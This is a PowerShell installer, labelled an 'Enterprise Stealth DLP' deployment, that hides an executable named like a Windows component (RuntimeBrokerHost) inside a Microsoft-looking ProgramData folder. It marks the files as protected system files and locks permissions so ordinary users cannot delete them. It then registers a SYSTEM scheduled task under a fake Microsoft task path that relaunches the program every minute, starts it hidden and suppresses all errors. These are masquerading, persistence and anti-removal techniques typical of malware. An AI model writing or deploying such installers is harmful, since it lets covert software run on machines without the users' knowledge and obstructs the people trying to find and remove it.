# ==============================================================================
# Enterprise Stealth DLP Deployment Script
# Installs RuntimeBrokerHost under NT AUTHORITY\SYSTEM with Anti-Kill Protection
# ==============================================================================
$ErrorActionPreference = "SilentlyContinue"

$targetDir = "$env:ProgramData\Microsoft\Crypto\SystemBroker"
$exeName = "RuntimeBrokerHost.exe"
$cfgName = "config.json"
$sourceDir = $PSScriptRoot
if (-not $sourceDir) {
    $sourceDir = Split-Path -Parent $MyInvocation.MyCommand.Path
}

# 1. Stop any currently running instance
taskkill.exe /F /IM $exeName >$null 2>&1
Stop-Process -Name "RuntimeBrokerHost" -Force -ErrorAction SilentlyContinue
Start-Sleep -Milliseconds 500

# 2. Reset permissions if folder already exists from previous install
if (Test-Path $targetDir) {
    & attrib.exe -h -s "$targetDir\*" >$null 2>&1
    & attrib.exe -h -s $targetDir >$null 2>&1
    & icacls.exe $targetDir /grant "BUILTIN\Administrators:(OI)(CI)F" >$null 2>&1
} else {
    New-Item -ItemType Directory -Path $targetDir -Force | Out-Null
}

# 3. Copy binary and config
Copy-Item "$sourceDir\$exeName" "$targetDir\$exeName" -Force
if (Test-Path "$sourceDir\$cfgName") {
    Copy-Item "$sourceDir\$cfgName" "$targetDir\$cfgName" -Force
}

# 4. Mark Super-Hidden (+h +s: Protected Operating System file)
& attrib.exe +h +s $targetDir
& attrib.exe +h +s "$targetDir\$exeName"
if (Test-Path "$targetDir\$cfgName") {
    & attrib.exe +h +s "$targetDir\$cfgName"
}

# 5. Lock NTFS Permissions (ANTI-DELETE & ANTI-TAMPER)
# SYSTEM and Administrators: Full Control
# Standard Users: Read & Execute (so it runs), but DENIED Delete, Modify, or Change Permissions
& icacls.exe $targetDir /inheritance:r /grant "NT AUTHORITY\SYSTEM:(OI)(CI)F" /grant "BUILTIN\Administrators:(OI)(CI)F" /grant "BUILTIN\Users:(OI)(CI)RX" /deny "BUILTIN\Users:(DE,DC,WDAC,WO)" >$null 2>&1

# 6. Register Task strictly under NT AUTHORITY\SYSTEM (Works on battery & AC)
$taskPath = "\Microsoft\Windows\Runtime\"
$taskName = "SystemBrokerHost"
$action = New-ScheduledTaskAction -Execute "$targetDir\$exeName"
$triggerBoot = New-ScheduledTaskTrigger -AtStartup
$triggerRepeat = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 1)
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -ExecutionTimeLimit 0 -MultipleInstancesPolicy IgnoreNew
$principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest

try {
    Unregister-ScheduledTask -TaskPath $taskPath -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
} catch {}

try {
    Register-ScheduledTask -TaskPath $taskPath -TaskName $taskName -Action $action -Trigger $triggerBoot, $triggerRepeat -Settings $settings -Principal $principal -Force | Out-Null
    Start-ScheduledTask -TaskPath $taskPath -TaskName $taskName -ErrorAction SilentlyContinue
} catch {}

# Fallback: If scheduled task didn't spawn the process yet, start directly
Start-Sleep -Milliseconds 500
$running = Get-Process -Name "RuntimeBrokerHost" -ErrorAction SilentlyContinue
if (-not $running) {
    Start-Process -FilePath "$targetDir\$exeName" -WindowStyle Hidden -ErrorAction SilentlyContinue
}

# NOTE: The installer files in this directory are preserved so you and your team can test repeatedly without files vanishing!
